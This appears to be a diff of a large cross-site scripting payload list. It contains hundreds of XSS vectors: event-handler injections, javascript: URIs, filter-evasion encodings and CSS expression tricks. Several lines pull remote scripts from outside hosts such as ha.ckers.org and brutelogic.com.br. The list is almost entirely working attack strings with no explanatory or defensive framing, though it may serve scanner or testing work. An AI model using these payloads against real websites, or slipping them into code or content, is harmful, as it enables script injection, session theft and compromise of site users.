-<u oncopy="alert(1)" contenteditable>test</u>
-<u oncut="alert(1)" contenteditable>test</u>
 <u ondblclick="alert(1)">test</u>
-<u onkeydown="alert(1)" contenteditable>test</u>
-<u onkeypress="alert(1)" contenteditable>test</u>
-<u onkeyup="alert(1)" contenteditable>test</u>
 <u onmousedown="alert(1)">test</u>
 <u onmouseenter="alert(1)">test</u>
 <u onmouseleave="alert(1)">test</u>
@@ -2039,17 +740,9 @@ eval(location.hash.slice(1)>#alert(1)
 <u onmouseout="alert(1)">test</u>
 <u onmouseover="alert(1)">test</u>
 <u onmouseup="alert(1)">test</u>
-<u onpaste="alert(1)" contenteditable>test</u>
-<ul draggable="true" ondrag="alert(1)">test</ul>
-<ul id=x tabindex=1 onactivate=alert(1)></ul>
-<ul id=x tabindex=1 onfocus=alert(1)></ul>
-<ul id=x tabindex=1 onfocusin=alert(1)></ul>
 <ul onclick="alert(1)">test</ul>
 <ul oncontextmenu="alert(1)">test</ul>
-<ul oncopy="alert(1)" contenteditable>test</ul>
-<ul oncut="alert(1)" contenteditable>test</ul>
 <ul ondblclick="alert(1)">test</ul>
-<ul onkeyup="alert(1)" contenteditable>test</ul>
 <ul onmousedown="alert(1)">test</ul>
 <ul onmouseenter="alert(1)">test</ul>
 <ul onmouseleave="alert(1)">test</ul>
@@ -2057,14 +750,7 @@ eval(location.hash.slice(1)>#alert(1)
 <ul onmouseout="alert(1)">test</ul>
 <ul onmouseover="alert(1)">test</ul>
 <ul onmouseup="alert(1)">test</ul>
-<ul onpaste="alert(1)" contenteditable>test</ul>
-<var id=x tabindex=1 onactivate=alert(1)></var>
-<var id=x tabindex=1 onfocus=alert(1)></var>
-<var id=x tabindex=1 onfocusin=alert(1)></var>
 <var onclick="alert(1)">test</var>
-<var oncontextmenu="alert(1)">test</var>
-<var oncopy="alert(1)" contenteditable>test</var>
-<var oncut="alert(1)" contenteditable>test</var>
 <var ondblclick="alert(1)">test</var>
 <var onmousedown="alert(1)">test</var>
 <var onmouseenter="alert(1)">test</var>
@@ -2074,24 +760,8 @@ eval(location.hash.slice(1)>#alert(1)
 <var onmouseover="alert(1)">test</var>
 <var onmouseup="alert(1)">test</var>
 <video onclick="alert(1)">test</video>
-<video oncontextmenu="alert(1)">test</video>
-<video ondblclick="alert(1)">test</video>
-<video onmousedown="alert(1)">test</video>
-<video onmouseenter="alert(1)">test</video>
-<video onmouseleave="alert(1)">test</video>
-<video onmousemove="alert(1)">test</video>
-<video onmouseout="alert(1)">test</video>
-<video onmouseover="alert(1)">test</video>
-<video onmouseup="alert(1)">test</video>
 <video src/onerror=alert(1)>
-<video><source onerror=alert(1) src=1></video>
-<wbr id=x tabindex=1 onactivate=alert(1)></wbr>
-<wbr id=x tabindex=1 onfocus=alert(1)></wbr>
-<wbr id=x tabindex=1 onfocusin=alert(1)></wbr>
 <wbr onclick="alert(1)">test</wbr>
-<wbr oncontextmenu="alert(1)">test</wbr>
-<wbr oncopy="alert(1)" contenteditable>test</wbr>
-<wbr oncut="alert(1)" contenteditable>test</wbr>
 <wbr ondblclick="alert(1)">test</wbr>
 <wbr onmousedown="alert(1)">test</wbr>
 <wbr onmouseenter="alert(1)">test</wbr>
@@ -2100,13 +770,7 @@ eval(location.hash.slice(1)>#alert(1)
 <wbr onmouseout="alert(1)">test</wbr>
 <wbr onmouseover="alert(1)">test</wbr>
 <wbr onmouseup="alert(1)">test</wbr>
-<xmp id=x tabindex=1 onactivate=alert(1)></xmp>
-<xmp id=x tabindex=1 onfocus=alert(1)></xmp>
-<xmp id=x tabindex=1 onfocusin=alert(1)></xmp>
 <xmp onclick="alert(1)">test</xmp>
-<xmp oncontextmenu="alert(1)">test</xmp>
-<xmp oncopy="alert(1)" contenteditable>test</xmp>
-<xmp oncut="alert(1)" contenteditable>test</xmp>
 <xmp ondblclick="alert(1)">test</xmp>
 <xmp onmousedown="alert(1)">test</xmp>
 <xmp onmouseenter="alert(1)">test</xmp>
@@ -2115,80 +779,44 @@ eval(location.hash.slice(1)>#alert(1)
 <xmp onmouseout="alert(1)">test</xmp>
 <xmp onmouseover="alert(1)">test</xmp>
 <xmp onmouseup="alert(1)">test</xmp>
-<xss id=x tabindex=1 onactivate=alert(1)></xss>
-<xss id=x tabindex=1 onfocus=alert(1)></xss>
-<xss id=x tabindex=1 onfocusin=alert(1)></xss>
-<<scr\0ipt/src=http://xss.com/xss.js></script
 ' onmouseover=alert(/XSS/)
-"><iframe%20src="http://google.com"%%203E
-x”</title><img src%3dx onerror%3dalert(1)>
-<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
-<var onmouseover="prompt(1)">On Mouse Over</var>?
-<img src="/" =_=" title="onerror='prompt(1)'">
 <%<!--'%><script>alert(1);</script -->
 <iframe/src \/\/onload = prompt(1)
 <iframe/onreadystatechange=alert(1)
 <svg/onload=alert(1)
-<input value=<><iframe/src=javascript:confirm(1)
-http://www.<script>alert(1)</script .com
 <svg><script ?>alert(1)
 <img src=`xx:xx`onerror=alert(1)>
-<math><a xlink:href="//jsfiddle.net/t846h/">click
-<svg contentScriptType=text/vbs><script>MsgBox+1
 <script>+-+-1-+-+alert(1)</script>
 <body/onload=&lt;!--&gt;&#10alert(1)>
-<img src ?itworksonchrome?\/onerror = alert(1)???
-<svg><script onlypossibleinopera:-)> alert(1)
 <script x> alert(1) </script 1=2
-<div/onmouseover='alert(1)'> style="x:">
 <--`<img/src=` onerror=alert(1)> --!>
-<math><a xlink:href="//jsfiddle.net/t846h/">click
 "><img src=x onerror=prompt(1);>
 <SCRIPT>alert('XSS');</SCRIPT>
 '';!--"<XSS>=&{()}
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
 <IMG SRC="jav	ascript:alert('XSS');">
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
-<IMG SRC="jav&#x0A;ascript:alert('XSS');">
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
-<IMG SRC=" &#14;  javascript:alert('XSS');">
-<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
 <IMG SRC="javascript:alert('XSS')"
 <SCRIPT>a=/XSS/
 \";alert('XSS');//
-<BODY BACKGROUND="javascript:alert('XSS')">
 <BODY ONLOAD=alert('XSS')>
 <IMG DYNSRC="javascript:alert('XSS')">
 <IMG LOWSRC="javascript:alert('XSS')">
-<BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
 <IMG SRC='vbscript:msgbox("XSS")'>
 <IMG SRC="mocha:[code]">
 <IMG SRC="livescript:[code]">
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-<TABLE BACKGROUND="javascript:alert('XSS')">
-<DIV STYLE="width: expression(alert('XSS'));">
-<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
-<XSS STYLE="xss:expression(alert('XSS'))">
 exp/*<XSS STYLE='no\xss:noxss("*//*");
-<BASE HREF="javascript:alert('XSS');//">
 getURL("javascript:alert('XSS')")
 a="get";
 <HTML><BODY>
 <? echo('<SCR)';
 <svg%0Aonload=%09((pro\u006dpt))()//
 <sCriPt x>(((confirm)))``</scRipt x>
-<w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
 <deTAiLs/open/oNtoGGle=confirm()>
-<scRiPt y="><">/*<sCRipt* */prompt()</script
-<A href="javascript%26colon;confirm()">click
 <sVg oNloaD=write()>
 <A href=javas%26#99;ript:alert(1)>click
-<sCrIpt/"<a"/srC=data:=".<a,[8].some(confirm)>
 <svG/x=">"/oNloaD=confirm()//
 <--`<iMG/srC=` onerror=confirm``> --!>
 <SVg </onlOad ="1> (_=prompt,_(1)) "">
@@ -2197,35 +825,25 @@ a="get";
 <sCRIpt x=">" src=//15.rs></script>
 <D3/OnMouSEenTer=[2].find(confirm)>z
 <D3"<"/OncLick="1>[confirm``]"<">z
-<D3/OnpOinTeReENter=confirm``>click here
 <Z oncut=alert()>x
 <iFrAMe/src \/\/onload = prompt(1)
-<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>
 >>> vectors()
-<![><img src="]><img src=x onerror=alert(39)//">
-<html xmlns="http://www.w3.org/1999/xhtml">
 <body>Hello</body>
 </html>//["'`-->]]>]</div>
-<div id="53"><xml id="xss" src="test.htc"></xml>
 <div id="62"><!-- IE 6-8 -->
 <!-- IE 6-9 -->
 <img src="javascript:alert(2)">
 <div id="66"><?xml version="1.0"?>
 <root/>//["'`-->]]>]</div>
 </svg>//["'`-->]]>]</div>
-<animation xlink:href="javascript:alert(88)"/>
 </svg>//["'`-->]]>]</div>
-<set attributeName="onmouseover" to="alert(89)"/>
 </svg>//["'`-->]]>]</div>
 <div id="90"><!-- Up to Opera 10.63 -->
-<div style=content:url(test2.svg)></div>
-<!-- Up to Opera 11.64 - see link below -->
 <!-- Up to Opera 12.x -->
 <div id="91">[A]
 <? foo="><script>alert(91)</script>">
 <! foo="><script>alert(91)</script>">
 </ foo="><script>alert(91)</script>">
-<? foo="><x foo='?><script>alert(91)</script>'>">
 </svg>//["'`-->]]>]</div>
 </svg>//["'`-->]]>]</div>
 <div id="97"><!-- IE 5-9 -->
@@ -2236,24 +854,18 @@ a="get";
 --><!--*{color:red}   /* all UA */
 </style>//["'`-->]]>]</div>
 </svg>//["'`-->]]>]</div>
-<div id="108"><!-- IE 5-8 standards mode -->
 <!-- IE 5-9 standards mode -->
 </svg>//["'`-->]]>]</div>
 </svg>//["'`-->]]>]</div>
 <div id="113"><div id="x">XXX</div>
 <div id="116"><div id="x">x</div>
 <xml:namespace prefix="t">
-<div id="117"><a href="http://attacker.org">
-<iframe src="http://example.org/"></iframe>
 </a>//["'`-->]]>]</div>
 xmlns:svg="http://www.w3.org/2000/svg">
 <body style="background:gray">
 </html>//["'`-->]]>]</div>
-<div id="123"><span class=foo>Some text</span>
 <div id="125"><?xml version="1.0"?>
 <!DOCTYPE doc [
-<!ATTLIST xsl:stylesheet id    ID    #REQUIRED>]>
-<svg xmlns="http://www.w3.org/2000/svg">
 <handler id="y">alert(127)</handler>
 </svg>//["'`-->]]>]</div>
 <div id="129"><svg>
@@ -2271,259 +883,111 @@ xmlns:svg="http://www.w3.org/2000/svg">
 <div id="134"><xmp>
 <%
 </xmp>
-<img alt='%></xmp><img src=xx:x onerror=aler
 *{color:red}</style>//["'`-->]]>]</div>
-<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
 <template match="/">
 </template>
 </stylesheet>//["'`-->]]>]</div>
-<div id="136"><form action="" method="post">
 <input name="username" value="admin" />
 <input type="submit">
 </form>//["'`-->]]>]</div>
 <div id="137"><svg>
 <circle r="400"></circle>
 </a>//["'`-->]]>]</div>
-<marquee loop=1 width=0 onfinish=alert(1)>
 <marguee/onstart=alert(1)>
 <svg onload=(alert)(1)>
 <script>$=1,alert($)</script>
-<form><button formaction="javascript:alert(1)">
 <div style=xss:expression(alert(1))>
 <div style=xss:expression(1)-alert(1)>
 <div style=xss:expressio\6e(alert(1))>
-<div style=xss:expressio\006e(alert(1))>
-<div style=xss:expressio\00006e(alert(1))>
 <div style=xss:expressio\6e(alert(1))>
-<div style=xss:expressio&#x5c;6e(alert(1))>
-<// style=x:expression\28javascript:alert(1)\29>
 <div style=content:url(%(svg)s)></div>
 <x style="behavior:url(%(sct)s)">
 <script>%(payload)s</script>
 <script src=%(jscript)s></script>
 <script>javascript:alert(1)</script>
-<IMG SRC="javascript:javascript:alert(1);">
-<IMG SRC=javascript:javascript:alert(1)>
-<IMG SRC=`javascript:javascript:alert(1)`>
 <SCRIPT SRC=%(jscript)s?<B>
 <BODY ONLOAD=javascript:alert(1)>
-<BODY ONLOAD=javascript:javascript:alert(1)>
-<IMG SRC="jav    ascript:javascript:alert(1);">
 <SCRIPT/SRC="%(jscript)s"></SCRIPT>
 <<SCRIPT>%(payload)s//<</SCRIPT>
-<IMG SRC="javascript:javascript:alert(1)"
 <iframe src=%(scriptlet)s <
-<IMG DYNSRC="javascript:javascript:alert(1)">
-<IMG LOWSRC="javascript:javascript:alert(1)">
-<BGSOUND SRC="javascript:javascript:alert(1);">
 <BR SIZE="&{javascript:alert(1)}">
 <LAYER SRC="%(scriptlet)s"></LAYER>
 <STYLE>@import'%(css)s';</STYLE>
 <XSS STYLE="behavior: url(%(htc)s);">
-<XSS STYLE="xss:expression(javascript:alert(1))">
-<BASE HREF="javascript:javascript:alert(1);//">
 <SCRIPT SRC="%(jpg)s"></SCRIPT>
 <STYLE>@import'%(css)s';</STYLE>
 <embed code=%(scriptlet)s></embed>
 <embed src=%(jscript)s></embed>
-<object onerror=javascript:javascript:alert(1)>
-<embed type="image" src=%(scriptlet)s></embed>
 <IMG SRC=&{javascript:alert(1);};>
 '';!--"<XSS>=&{()}
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG SRC=javascript:alert("XSS")>
-<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC=# onmouseover="alert('xxs')">
 <IMG SRC= onmouseover="alert('xxs')">
 <IMG onmouseover="alert('xxs')">
 <IMG SRC="jav ascript:alert('XSS');">
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
-<IMG SRC="jav&#x0A;ascript:alert('XSS');">
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
-<IMG SRC=" &#14;  javascript:alert('XSS');">
 <<SCRIPT>alert("XSS");//<</SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
 <SCRIPT SRC=//ha.ckers.org/.j>
 <IMG SRC="javascript:alert('XSS')"
-<iframe src=http://ha.ckers.org/scriptlet.html <
 \";alert('XSS');//
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
-<BODY BACKGROUND="javascript:alert('XSS')">
 <IMG DYNSRC="javascript:alert('XSS')">
 <IMG LOWSRC="javascript:alert('XSS')">
 <IMG SRC='vbscript:msgbox("XSS")'>
 <IMG SRC="livescript:[code]">
 <BODY ONLOAD=alert('XSS')>
-<BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
-<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
-<XSS STYLE="xss:expression(alert('XSS'))">
 <XSS STYLE="behavior: url(xss.htc);">
 ¼script¾alert(¢XSS¢)¼/script¾
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-<TABLE BACKGROUND="javascript:alert('XSS')">
-<TABLE><TD BACKGROUND="javascript:alert('XSS')">
-<DIV STYLE="width: expression(alert('XSS'));">
-<BASE HREF="javascript:alert('XSS');//">
 <A HREF="http://66.102.7.147/">XSS</A>
 <A HREF="http://1113982867/">XSS</A>
-<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
-<A HREF="http://0102.0146.0007.00000223/">XSS</A>
-<A HREF="htt p://6 6.000146.0x7.147/">XSS</A>
-<iframe  src="&Tab;javascript:prompt(1)&Tab;">
-<sVg><scRipt >alert&lpar;1&rpar; {Opera}
-<img/src=`` onerror=this.onerror=confirm(1) 
-<img src=``&NewLine; onerror=alert(1)&NewLine;
-<script /**/>/**/alert(1)/**/</script /**/
-&#34;&#62;<h1/onmouseover='\u0061lert(1)'>
-<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
-<img/src=@&#32;&#13; onerror = prompt('&#49;')
-<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
 <script ~~~>alert(0%0)</script ~~~>
 <iframe// src=javaSCRIPT&colon;alert(1)
-<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
-<var onmouseover="prompt(1)">On Mouse Over</var>
-<img src="/" =_=" title="onerror='prompt(1)'">
 <%<!--'%><script>alert(1);</script -->
 <iframe/src \/\/onload = prompt(1)
 <iframe/onreadystatechange=alert(1)
 <svg/onload=alert(1)
-<input value=<><iframe/src=javascript:confirm(1)
-http://www.<script>alert(1)</script .com
 <svg><script ?>alert(1)
 <img src=`xx:xx`onerror=alert(1)>
-<math><a xlink:href="//jsfiddle.net/t846h/">click
-<svg contentScriptType=text/vbs><script>MsgBox+1
 <script>+-+-1-+-+alert(1)</script>
 <body/onload=&lt;!--&gt;&#10alert(1)>
-<img src ?itworksonchrome?\/onerror = alert(1)
-<svg><script onlypossibleinopera:-)> alert(1)
 <script x> alert(1) </script 1=2
-<div/onmouseover='alert(1)'> style="x:">
 <--`<img/src=` onerror=alert(1)> --!>
-<math><a xlink:href="//jsfiddle.net/t846h/">click
-'`"><\x00script>javascript:alert(1)</script>
 \x3Cscript>javascript:alert(1)</script>
 <script>javascript:alert(1)</script\x0D
 <script>javascript:alert(1)</script\x0A
 <script>javascript:alert(1)</script\x0B
-`"'><img src='#\x27 onerror=javascript:alert(1)>
-'`"><\x3Cscript>javascript:alert(1)</script>
-'`"><\x00script>javascript:alert(1)</script>
-"`'><script>\x3Bjavascript:alert(1)</script>
-"`'><script>\x0Djavascript:alert(1)</script>
-"`'><script>\x09javascript:alert(1)</script>
-"`'><script>\x00javascript:alert(1)</script>
-"`'><script>\x0Cjavascript:alert(1)</script>
-"`'><script>\x2Bjavascript:alert(1)</script>
-"`'><script>-javascript:alert(1)</script>
-"`'><script>\x0Ajavascript:alert(1)</script>
-"`'><script>\x7Ejavascript:alert(1)</script>
-"`'><script>\xC2\x85javascript:alert(1)</script>
-"`'><script>\x21javascript:alert(1)</script>
-"`'><script>\x0Bjavascript:alert(1)</script>
-"`'><script>\x20javascript:alert(1)</script>
-"`'><script>\xC2\xA0javascript:alert(1)</script>
-<script\x2F>javascript:alert(1)</script>
-<script\x20>javascript:alert(1)</script>
-<script\x0D>javascript:alert(1)</script>
-<script\x0A>javascript:alert(1)</script>
-<script\x0C>javascript:alert(1)</script>
-<script\x00>javascript:alert(1)</script>
-<script\x09>javascript:alert(1)</script>
-<script>javascript:alert(1)<\x00/script>
-<img src=# onerror\x3D"javascript:alert(1)" >
-<input onfocus=javascript:alert(1) autofocus>
-<video poster=javascript:javascript:alert(1)//
 <frameset onload=javascript:alert(1)>
-<object data="data:text/html;base64,%(base64)s">
-<embed src="data:text/html;base64,%(base64)s">
 <b <script>alert(1)</script>0
 <embed src="javascript:alert(1)">
 <img src="javascript:alert(1)">
 <image src="javascript:alert(1)">
 <script src="javascript:alert(1)">
-<? foo="><script>javascript:alert(1)</script>">
-<! foo="><script>javascript:alert(1)</script>">
-</ foo="><script>javascript:alert(1)</script>">
 <img \x00src=x onerror="alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
-<img \x11src=x onerror="javascript:alert(1)">
-<img \x12src=x onerror="javascript:alert(1)">
-<img\x47src=x onerror="javascript:alert(1)">
-<img\x10src=x onerror="javascript:alert(1)">
-<img\x13src=x onerror="javascript:alert(1)">
-<img\x32src=x onerror="javascript:alert(1)">
-<img\x47src=x onerror="javascript:alert(1)">
-<img\x11src=x onerror="javascript:alert(1)">
-<img \x47src=x onerror="javascript:alert(1)">
-<img \x34src=x onerror="javascript:alert(1)">
-<img \x39src=x onerror="javascript:alert(1)">
-<img \x00src=x onerror="javascript:alert(1)">
-<img src\x09=x onerror="javascript:alert(1)">
-<img src\x10=x onerror="javascript:alert(1)">
-<img src\x13=x onerror="javascript:alert(1)">
-<img src\x32=x onerror="javascript:alert(1)">
-<img src\x12=x onerror="javascript:alert(1)">
-<img src\x11=x onerror="javascript:alert(1)">
-<img src\x00=x onerror="javascript:alert(1)">
-<img src\x47=x onerror="javascript:alert(1)">
-<img src=x\x09onerror="javascript:alert(1)">
-<img src=x\x10onerror="javascript:alert(1)">
-<img src=x\x11onerror="javascript:alert(1)">
-<img src=x\x12onerror="javascript:alert(1)">
-<img src=x\x13onerror="javascript:alert(1)">
-<img[a][b][c]src[d]=x[e]onerror=[f]"alert(1)">
-<img src=x onerror=\x09"javascript:alert(1)">
-<img src=x onerror=\x10"javascript:alert(1)">
-<img src=x onerror=\x11"javascript:alert(1)">
-<img src=x onerror=\x12"javascript:alert(1)">
-<img src=x onerror=\x32"javascript:alert(1)">
-<img src=x onerror=\x00"javascript:alert(1)">
-<!--[if]><script>javascript:alert(1)</script -->
 <script src="/\%(jscript)s"></script>
 <script src="\\%(jscript)s"></script>
 <style>*[{}@import'%(css)s?]</style>X
-<div style="font-family:foo}color=red;">XXX
-<<scr\0ipt/src=http://xss.com/xss.js></script
 ' onmouseover=alert(/Black.Spook/)
-"><iframe%20src="http://google.com"%%203E
-x”</title><img src%3dx onerror%3dalert(1)>
-<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
-<var onmouseover="prompt(1)">On Mouse Over</var>?
-<img src="/" =_=" title="onerror='prompt(1)'">
 <%<!--'%><script>alert(1);</script -->
 <iframe/src \/\/onload = prompt(1)
 <iframe/onreadystatechange=alert(1)
 <svg/onload=alert(1)
-<input value=<><iframe/src=javascript:confirm(1)
-http://www.<script>alert(1)</script .com
 <svg><script ?>alert(1)
 <img src=`xx:xx`onerror=alert(1)>
-<math><a xlink:href="//jsfiddle.net/t846h/">click
-<svg contentScriptType=text/vbs><script>MsgBox+1
 <script>+-+-1-+-+alert(1)</script>
 <body/onload=&lt;!--&gt;&#10alert(1)>
-<img src ?itworksonchrome?\/onerror = alert(1)???
-<svg><script onlypossibleinopera:-)> alert(1)
 <script x> alert(1) </script 1=2
-<div/onmouseover='alert(1)'> style="x:">
 <--`<img/src=` onerror=alert(1)> --!>
-<math><a xlink:href="//jsfiddle.net/t846h/">click
 "><img src=x onerror=prompt(1);>
-<![><img src="]><img src=x onerror=alert(39)//">
 
-<html xmlns="http://www.w3.org/1999/xhtml">
 <head>
 <style type="text/css">
 </style>
 </head>
 <body>Hello</body>
 </html>//["'`-->]]>]</div>
-<div id="53"><xml id="xss" src="test.htc"></xml>
 
 <div id="62"><!-- IE 6-8 -->
 
@@ -2542,19 +1006,15 @@ http://www.<script>alert(1)</script .com
 </svg>//["'`-->]]>]</div>
 
 
-<animation xlink:href="javascript:alert(88)"/>
 
 
 
 </svg>//["'`-->]]>]</div>
 
-<set attributeName="onmouseover" to="alert(89)"/>
 </svg>//["'`-->]]>]</div>
 
 <div id="90"><!-- Up to Opera 10.63 -->
-<div style=content:url(test2.svg)></div>
 
-<!-- Up to Opera 11.64 - see link below -->
 
 <!-- Up to Opera 12.x -->
 
@@ -2563,7 +1023,6 @@ http://www.<script>alert(1)</script .com
 <! foo="><script>alert(91)</script>">
 </ foo="><script>alert(91)</script>">
 [B]
-<? foo="><x foo='?><script>alert(91)</script>'>">
 [C]
 [D]
 </svg>//["'`-->]]>]</div>
@@ -2588,7 +1047,6 @@ http://www.<script>alert(1)</script .com
 
 </style>//["'`-->]]>]</div>
 </svg>//["'`-->]]>]</div>
-<div id="108"><!-- IE 5-8 standards mode -->
 
 <!-- IE 5-9 standards mode -->
 
@@ -2607,8 +1065,6 @@ http://www.<script>alert(1)</script .com
 <div id="116"><div id="x">x</div>
 <xml:namespace prefix="t">
 
-<div id="117"><a href="http://attacker.org">
-    <iframe src="http://example.org/"></iframe>
 </a>//["'`-->]]>]</div>
 
     <h1>Drop me</h1>
@@ -2633,7 +1089,6 @@ xmlns:svg="http://www.w3.org/2000/svg">
 </svg:svg>
 </body>
 </html>//["'`-->]]>]</div>
-<div id="123"><span class=foo>Some text</span>
 
 <script>
 $("span.foo").click(function() {
@@ -2651,7 +1106,6 @@ location="http://html5sec.org";
 <!DOCTYPE doc [
 <!ATTLIST xsl:stylesheet
   id    ID    #REQUIRED>]>
-<svg xmlns="http://www.w3.org/2000/svg">
         <xsl:template match="/">
         </xsl:template>
     </xsl:stylesheet>
@@ -2706,11 +1160,9 @@ XXX
 -->{}
 *{color:red}</style>//["'`-->]]>]</div>
 
-<stylesheet xmlns="http://www.w3.org/TR/WD-xsl">
 <template match="/">
 </template>
 </stylesheet>//["'`-->]]>]</div>
-<div id="136"><form action="" method="post">
 <input name="username" value="admin" />
 <input type="submit">
 </form>//["'`-->]]>]</div>
@@ -2741,21 +1193,15 @@ eval(location.hash.slice(1)>#alert(1)
 '-alert(1)//
 \'-alert(1)//
 </script><svg onload=alert(1)>
-<x contenteditable onblur=alert(1)>lose focus!
 <x onclick=alert(1)>click this!
 <x oncopy=alert(1)>copy this!
-<x oncontextmenu=alert(1)>right click this!
 <x oncut=alert(1)>copy this!
-<x ondblclick=alert(1)>double click this!
 <x ondrag=alert(1)>drag this!
-<x contenteditable onfocus=alert(1)>focus this!
-<x contenteditable oninput=alert(1)>input here!
 <x onmousedown=alert(1)>click this!
 <x onmousemove=alert(1)>hover this!
 <x onmouseout=alert(1)>hover this!
 <x onmouseover=alert(1)>hover this!
 <x onmouseup=alert(1)>click this!
-<x contenteditable onpaste=alert(1)>paste here!
 <script>alert(1)//
 <script>alert(1)<!–
 <script src=//brutelogic.com.br/1.js>
@@ -2793,10 +1239,7 @@ eval(location.hash.slice(1)>#alert(1)
 <iframe src=javascript:alert(1)>
 <embed src=javascript:alert(1)>
 <a href=javascript:alert(1)>click
-<math><brute href=javascript:alert(1)>click
 <object data=javascript:alert(1)>
-<svg><script xlink:href=data:,alert(1) />
-<math><brute xlink:href=javascript:alert(1)>click
 <html ontouchstart=alert(1)>
 <html ontouchend=alert(1)>
 <html ontouchmove=alert(1)>
@@ -2805,55 +1248,34 @@ eval(location.hash.slice(1)>#alert(1)
 "><img src=1 onerror=alert(1)>.gif
 <script src="data:&comma;alert(1)//
 "><script src=data:&comma;alert(1)//
-<script src="//brutelogic.com.br&sol;1.js&num;
-"><script src=//brutelogic.com.br&sol;1.js&num;
 <base href=//0>
 <body onload=alert(1)>
 <body onpageshow=alert(1)>
 <body onfocus=alert(1)>
-<body onscroll=alert(1)><br><br><br><br>
 <body onresize=alert(1)>press F12!
 <body onhelp=alert(1)>press F1! (MSIE)
 <marquee onstart=alert(1)>
-<marquee loop=1 width=0 onfinish=alert(1)>
 <audio src onloadstart=alert(1)>
 <video onloadstart=alert(1)><source>
 <input autofocus onblur=alert(1)>
 <keygen autofocus onfocus=alert(1)>
-<form onsubmit=alert(1)><input type=submit>
-<select onchange=alert(1)><option>1<option>2
 <SCRIPT>alert('XSS');</SCRIPT>
 '';!--"<XSS>=&{()}
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
 <IMG SRC="jav	ascript:alert('XSS');">
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
-<IMG SRC="jav&#x0A;ascript:alert('XSS');">
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
-<IMG SRC=" &#14;  javascript:alert('XSS');">
-<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
 <IMG SRC="javascript:alert('XSS')"
 <SCRIPT>a=/XSS/
 \";alert('XSS');//
-<BODY BACKGROUND="javascript:alert('XSS')">
 <BODY ONLOAD=alert('XSS')>
 <IMG DYNSRC="javascript:alert('XSS')">
 <IMG LOWSRC="javascript:alert('XSS')">
-<BGSOUND SRC="javascript:alert('XSS');">
 <BR SIZE="&{alert('XSS')}">
 <IMG SRC='vbscript:msgbox("XSS")'>
 <IMG SRC="mocha:[code]">
 <IMG SRC="livescript:[code]">
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
-<TABLE BACKGROUND="javascript:alert('XSS')">
-<DIV STYLE="width: expression(alert('XSS'));">
-<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
-<XSS STYLE="xss:expression(alert('XSS'))">
 exp/*<XSS STYLE='no\xss:noxss("*//*");
-<BASE HREF="javascript:alert('XSS');//">
 getURL("javascript:alert('XSS')")
 a="get";
 <HTML><BODY>
@@ -2864,57 +1286,36 @@ a="get";
 a29b1%3balert(888)//a62b7156d82
 <scr&#x9ipt>alert('XSS')</scr&#x9ipt>
 "onmouseover%3dprompt(941634) 
-%f6%22%20onmouseover%3dprompt(941634)%20
 " onerror=alert()1 a="
 style=xss:expression(alert(1))
 <input type=text value=“XSS”>
 	A” autofocus onfocus=alert(“XSS”)//
 <a href="javascript:alert(1)">ssss</a>
-+ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-
 <%00script>alert(‘XSS’)<%00/script>
 <%script>alert(‘XSS’)<%/script>
-<%tag style=”xss:expression(alert(‘XSS’))”>
-</b style="expr/**/ession(alert('vulnerable'))">
 '';!--"<XSS>=&{()}
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
 <IMG SRC="javascript:alert('XSS');">
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
-<IMG """><SCRIPT>alert("XSS")</SCRIPT>">
 <IMG SRC="jav	ascript:alert('XSS');">
-<IMG SRC="jav&#x09;ascript:alert('XSS');">
-<IMG SRC="jav&#x0A;ascript:alert('XSS');">
-<IMG SRC="jav&#x0D;ascript:alert('XSS');">
-<IMG SRC=" &#14;  javascript:alert('XSS');">
 <<SCRIPT>alert("XSS");//<</SCRIPT>
-<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>
 <SCRIPT SRC=//ha.ckers.org/.j>
-<iframe src=http://ha.ckers.org/scriptlet.html <
 <IMG SRC="javascript:alert('XSS')"
 <SCRIPT>a=/XSS/
 alert(a.source)</SCRIPT>
 \";alert('XSS');//
 </TITLE><SCRIPT>alert("XSS");</SCRIPT>
-<BODY BACKGROUND="javascript:alert('XSS')">
